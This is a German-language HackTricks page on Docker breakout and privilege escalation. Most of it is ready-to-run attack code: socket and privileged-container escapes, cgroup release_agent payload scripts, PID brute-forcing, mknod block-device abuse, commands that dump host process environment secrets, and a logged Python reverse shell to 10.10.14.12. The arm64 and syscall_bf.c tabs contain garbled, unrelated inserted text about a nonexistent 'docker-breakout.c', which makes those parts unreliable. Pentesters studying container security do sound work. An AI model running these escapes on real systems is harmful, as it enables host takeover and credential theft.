# Docker Breakout / Privilege Escalation

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Automatische Enumeration & Flucht

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Es kann auch **Container aufzählen**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Dieses Tool ist ziemlich **nützlich, um den Container zu aufzählen, in dem Sie sich befinden, und sogar automatisch zu versuchen, zu entkommen**
* [**amicontained**](https://github.com/genuinetools/amicontained): Nützliches Tool, um die Berechtigungen des Containers zu erhalten, um Wege zu finden, daraus zu entkommen
* [**deepce**](https://github.com/stealthcopter/deepce): Tool zum Aufzählen und Entkommen aus Containern
* [**grype**](https://github.com/anchore/grype): Erhalten Sie die CVEs, die in der installierten Software des Images enthalten sind

## Montierter Docker-Socket-Ausbruch

Wenn Sie auf irgendeine Weise feststellen, dass der **Docker-Socket im Docker-Container eingebunden ist**, können Sie daraus entkommen.\
Dies geschieht normalerweise in Docker-Containern, die aus irgendeinem Grund eine Verbindung zum Docker-Daemon herstellen müssen, um Aktionen auszuführen.

```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```

In diesem Fall können Sie reguläre Docker-Befehle verwenden, um mit dem Docker-Daemon zu kommunizieren:

```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```

{% hint style="info" %}
Falls der **Docker-Socket an einem unerwarteten Ort** ist, können Sie dennoch mit dem **`docker`** Befehl und dem Parameter **`-H unix:///path/to/docker.sock`** kommunizieren.
{% endhint %}

Der Docker-Daemon könnte auch auf einem Port lauschen (standardmäßig 2375, 2376) oder auf Systemd-basierten Systemen kann die Kommunikation mit dem Docker-Daemon über den Systemd-Socket `fd://` erfolgen.

{% hint style="info" %}
Zusätzlich sollten Sie auf die Laufzeit-Sockets anderer High-Level-Runtimes achten:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Missbrauch von Berechtigungen entkommen

Sie sollten die Berechtigungen des Containers überprüfen. Wenn er eine der folgenden hat, könnten Sie daraus entkommen: **`CAP_SYS_ADMIN`**, **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Sie können die aktuellen Container-Berechtigungen mit den **zuvor genannten automatischen Tools** oder überprüfen:

```bash
capsh --print
```

## Flucht aus privilegierten Containern

Ein privilegierter Container kann mit der Flagge `--privileged` erstellt werden oder indem spezifische Abwehrmechanismen deaktiviert werden:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Die `--privileged`-Flagge senkt die Sicherheit des Containers erheblich, bietet **uneingeschränkten Gerätezugriff** und umgeht **mehrere Schutzmechanismen**. Für eine detaillierte Aufschlüsselung siehe die Dokumentation zu den vollständigen Auswirkungen von `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privileged + hostPID

Mit diesen Berechtigungen können Sie einfach **in den Namespace eines als root ausgeführten Prozesses im Host** wechseln, wie z. B. init (pid:1), indem Sie einfach ausführen: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Testen Sie dies in einem Container durch Ausführen:

```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```

### Privileged

Nur mit der privilegierten Flagge können Sie versuchen, **auf die Festplatte des Hosts zuzugreifen** oder versuchen, **den release\_agent oder andere Escapes zu missbrauchen**.

Testen Sie die folgenden Umgehungen in einem Container durch Ausführen:

```bash
docker run --rm -it --privileged ubuntu bash
```

#### Einhängen der Festplatte - Poc1

Gut konfigurierte Docker-Container werden den Befehl **fdisk -l** nicht zulassen. Auf einem falsch konfigurierten Docker-Befehl, bei dem die Option `--privileged` oder `--device=/dev/sda1` mit Berechtigungen angegeben ist, ist es jedoch möglich, die Berechtigungen zu erhalten, um das Host-Laufwerk zu sehen.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Um also die Kontrolle über die Host-Maschine zu übernehmen, ist es trivial:

```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```

Und voilà! Sie können jetzt auf das Dateisystem des Hosts zugreifen, da es im Ordner `/mnt/hola` eingebunden ist.

#### Einhängen der Festplatte - Poc2

Innerhalb des Containers kann ein Angreifer versuchen, über ein beschreibbares hostPath-Volume, das vom Cluster erstellt wurde, weiteren Zugriff auf das zugrunde liegende Host-Betriebssystem zu erlangen. Im Folgenden sind einige häufige Dinge aufgeführt, die Sie im Container überprüfen können, um zu sehen, ob Sie diesen Angriffsvektor nutzen können:

```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```

#### Privileged Escape Ausnutzung des vorhandenen release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Ursprünglicher PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

Finde eine **Erklärung der Technik** in:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Privileged Escape unter Ausnutzung von release\_agent ohne den relativen Pfad zu kennen - PoC3

In den vorherigen Exploits wurde der **absolute Pfad des Containers im Dateisystem des Hosts offengelegt**. Dies ist jedoch nicht immer der Fall. In Fällen, in denen Sie **den absoluten Pfad des Containers im Host nicht kennen**, können Sie diese Technik verwenden:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}

```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```

Die Ausführung des PoC innerhalb eines privilegierten Containers sollte eine ähnliche Ausgabe wie folgt liefern:

```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```

#### Privileged Escape Missbrauch von sensiblen Mounts

Es gibt mehrere Dateien, die möglicherweise eingebunden sind und **Informationen über den zugrunde liegenden Host preisgeben**. Einige von ihnen können sogar **anzeigen, dass etwas vom Host ausgeführt wird, wenn etwas passiert** (was einem Angreifer ermöglichen würde, aus dem Container auszubrechen).\
Der Missbrauch dieser Dateien kann dazu führen, dass:

* release\_agent (bereits zuvor behandelt)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Sie können jedoch **andere sensible Dateien** auf dieser Seite überprüfen:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Beliebige Mounts

In mehreren Fällen werden Sie feststellen, dass der **Container ein Volume vom Host eingebunden hat**. Wenn dieses Volume nicht korrekt konfiguriert wurde, könnten Sie möglicherweise auf **sensible Daten zugreifen/Änderungen vornehmen**: Geheime Informationen lesen, ssh authorized\_keys ändern...

```bash
docker run --rm -it -v /:/host ubuntu bash
```

### Privilege Escalation mit 2 Shells und Host-Mount

Wenn Sie als **Root innerhalb eines Containers** Zugriff haben, der einen Ordner vom Host gemountet hat, und Sie als **nicht privilegierter Benutzer auf den Host entkommen sind** und Lesezugriff auf den gemounteten Ordner haben.\
Sie können eine **Bash SUID-Datei** im **gemounteten Ordner** innerhalb des **Containers** erstellen und sie vom Host ausführen, um eine Privilegieneskalation durchzuführen.

```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```

### Privilege Escalation mit 2 Shells

Wenn Sie als **Root innerhalb eines Containers** Zugriff haben und als **nicht privilegierter Benutzer auf den Host entkommen sind**, können Sie beide Shells missbrauchen, um **die Privilegien im Host zu eskalieren**, wenn Sie die Fähigkeit MKNOD innerhalb des Containers haben (standardmäßig vorhanden), wie in diesem Beitrag [**erklärt**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Mit dieser Fähigkeit darf der Root-Benutzer im Container **Blockgerätedateien erstellen**. Gerätedateien sind spezielle Dateien, die verwendet werden, um **auf die zugrunde liegende Hardware und Kernelmodule zuzugreifen**. Zum Beispiel ermöglicht die Blockgerätedatei /dev/sda den Zugriff, **die Rohdaten auf der Systemsfestplatte zu lesen**.

Docker schützt vor dem Missbrauch von Blockgeräten in Containern, indem es eine cgroup-Richtlinie durchsetzt, die **Blockgeräte-Lese-/Schreiboperationen blockiert**. Wenn jedoch ein Blockgerät **innerhalb des Containers erstellt wird**, ist es über das Verzeichnis **/proc/PID/root/** von außerhalb des Containers aus zugänglich. Dieser Zugriff erfordert, dass der **Prozessbesitzer sowohl innerhalb als auch außerhalb des Containers gleich ist**.

**Exploitation** Beispiel aus diesem [**Bericht**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):

```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```

### hostPID

Wenn Sie auf die Prozesse des Hosts zugreifen können, werden Sie in der Lage sein, auf viele sensible Informationen zuzugreifen, die in diesen Prozessen gespeichert sind. Führen Sie das Testlabor aus:

```
docker run --rm -it --pid=host ubuntu bash
```

Zum Beispiel können Sie die Prozesse auflisten, indem Sie etwas wie `ps auxn` verwenden und nach sensiblen Details in den Befehlen suchen.

Dann können Sie, da Sie **auf jeden Prozess des Hosts in /proc/ zugreifen können, einfach ihre Umgebungsgeheimnisse stehlen**, indem Sie ausführen:

```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```

Du kannst auch **auf die Dateideskriptoren anderer Prozesse zugreifen und deren geöffnete Dateien lesen**:

```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```

Du kannst auch **Prozesse beenden und einen DoS verursachen**.

{% hint style="warning" %}
Wenn du irgendwie privilegierten **Zugriff auf einen Prozess außerhalb des Containers** hast, könntest du etwas wie `nsenter --target <pid> --all` oder `nsenter --target <pid> --mount --net --pid --cgroup` ausführen, um **eine Shell mit denselben ns-Beschränkungen** (hoffentlich keine) **wie dieser Prozess zu starten**.
{% endhint %}

### hostNetwork

```
docker run --rm -it --network=host ubuntu bash
```

Wenn ein Container mit dem Docker [Host-Netzwerktreiber (`--network=host`)](https://docs.docker.com/network/host/) konfiguriert wurde, ist der Netzwerkstack dieses Containers nicht vom Docker-Host isoliert (der Container teilt den Netzwerk-Namensraum des Hosts) und der Container erhält keine eigene IP-Adresse zugewiesen. Mit anderen Worten, **der Container bindet alle Dienste direkt an die IP-Adresse des Hosts**. Darüber hinaus kann der Container **ALLE Netzwerkdatenverkehr abfangen, den der Host** über das gemeinsame Interface sendet und empfängt `tcpdump -i eth0`.

Beispielsweise können Sie dies verwenden, um den Datenverkehr zwischen Host und Metadateninstanz **abzufangen und sogar zu fälschen**.

Wie in den folgenden Beispielen:

* [Bericht: Wie man Google SRE kontaktiert: Eine Shell in Cloud SQL ablegen](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [MITM-Metadatendienst ermöglicht Privilegieneskalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Sie können auch auf **Netzwerkdienste zugreifen, die an localhost gebunden sind** innerhalb des Hosts oder sogar auf die **Metadatenberechtigungen des Knotens** zugreifen (die möglicherweise von denen abweichen, auf die ein Container zugreifen kann).

### hostIPC

```bash
docker run --rm -it --ipc=host ubuntu bash
```

Mit `hostIPC=true` erhalten Sie Zugriff auf die Inter-Process Communication (IPC)-Ressourcen des Hosts, wie z.B. **Shared Memory** in `/dev/shm`. Dies ermöglicht das Lesen/Schreiben, wenn die gleichen IPC-Ressourcen von anderen Host- oder Pod-Prozessen verwendet werden. Verwenden Sie `ipcs`, um diese IPC-Mechanismen genauer zu untersuchen.

* **Überprüfen von /dev/shm** - Suchen Sie nach Dateien an diesem Speicherort für den gemeinsamen Speicher: `ls -la /dev/shm`
* **Überprüfen vorhandener IPC-Einrichtungen** - Sie können überprüfen, ob IPC-Einrichtungen mit `/usr/bin/ipcs` verwendet werden. Überprüfen Sie dies mit: `ipcs -a`

### Wiederherstellen von Berechtigungen

Wenn der Systemaufruf **`unshare`** nicht verboten ist, können Sie alle Berechtigungen wiederherstellen, indem Sie ausführen:

```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```

### Missbrauch von Benutzernamensräumen über Symlink

Die zweite Technik, die im Beitrag [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) erklärt wird, zeigt, wie Sie Bind-Mounts mit Benutzernamensräumen missbrauchen können, um Dateien innerhalb des Hosts zu beeinflussen (in diesem speziellen Fall Dateien zu löschen).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
Heute noch Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc-Exploit (CVE-2019-5736)

Falls Sie `docker exec` als Root ausführen können (wahrscheinlich mit sudo), können Sie versuchen, Berechtigungen zu eskalieren, indem Sie aus einem Container ausbrechen und CVE-2019-5736 missbrauchen (Exploit [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Diese Technik wird im Wesentlichen die _**/bin/sh**_-Binärdatei des **Hosts** **aus einem Container heraus überschreiben**, sodass jeder, der docker exec ausführt, das Payload auslösen kann.

Passen Sie das Payload entsprechend an und erstellen Sie main.go mit `go build main.go`. Die resultierende Binärdatei sollte im Docker-Container platziert werden, um ausgeführt zu werden.\
Bei der Ausführung, sobald `[+] Overwritten /bin/sh successfully` angezeigt wird, müssen Sie Folgendes vom Host-Rechner ausführen:

`docker exec -it <container-name> /bin/sh`

Dies löst das Payload aus, das in der main.go-Datei vorhanden ist.

Für weitere Informationen: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Es gibt auch andere CVEs, für die der Container anfällig sein kann. Eine Liste finden Sie unter [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Eigenständige Docker-Eskapade

### Docker-Eskapade-Oberfläche

* **Namensräume:** Der Prozess sollte über Namensräume **vollständig von anderen Prozessen getrennt sein**, sodass wir nicht mit anderen Prozessen interagieren können, die aufgrund von Namensräumen (standardmäßig nicht über IPCs, Unix-Sockets, Netzwerkdienste, D-Bus, `/proc` anderer Prozesse kommunizieren können).
* **Root-Benutzer**: Standardmäßig ist der Benutzer, der den Prozess ausführt, der Root-Benutzer (jedoch sind seine Berechtigungen eingeschränkt).
* **Berechtigungen**: Docker lässt die folgenden Berechtigungen: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: Dies sind die Syscalls, die der **Root-Benutzer nicht aufrufen kann** (aufgrund fehlender Berechtigungen + Seccomp). Die anderen Syscalls könnten verwendet werden, um einen Ausbruch zu versuchen.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 syscalls" %}
### Docker Breakout Privilege Escalation

#### Description

This module demonstrates how an attacker can escalate privileges from a Docker container to the host system by exploiting a vulnerability in the Docker daemon.

#### Usage

1. Compile the `docker-breakout.c` file on the target system.
2. Run the compiled binary within a Docker container.
3. Follow the on-screen instructions to escalate privileges.

#### Example

```bash
gcc -static -o docker-breakout docker-breakout.c
docker run -v /:/host -it alpine /host/docker-breakout
```

#### Disclaimer

This module is for educational purposes only. Do not use it for illegal activities.

```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}
### Docker Breakout Privilege Escalation

#### Description

This technique involves exploiting a vulnerability in the Docker daemon to escalate privileges and break out of a Docker container to gain access to the host system.

#### Attack Scenario

1. **Identify Docker Daemon**: Find the Docker daemon running on the target system.
2. **Exploit Vulnerability**: Exploit a vulnerability in the Docker daemon to gain root access.
3. **Break Out of Container**: Use the escalated privileges to break out of the Docker container.
4. **Gain Access to Host**: Once outside the container, the attacker can access the host system.

#### Mitigation

* Regularly update Docker to patch known vulnerabilities.
* Implement least privilege principles to restrict container capabilities.
* Monitor Docker daemon logs for suspicious activities.

#### References

* [Docker Security](https://docs.docker.com/engine/security/security/)
* [Docker Security Best Practices](https://docs.docker.com/engine/security/best-practices/)

#### Disclaimer

This information is for educational purposes only. Do not attempt to perform any illegal activities.

````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

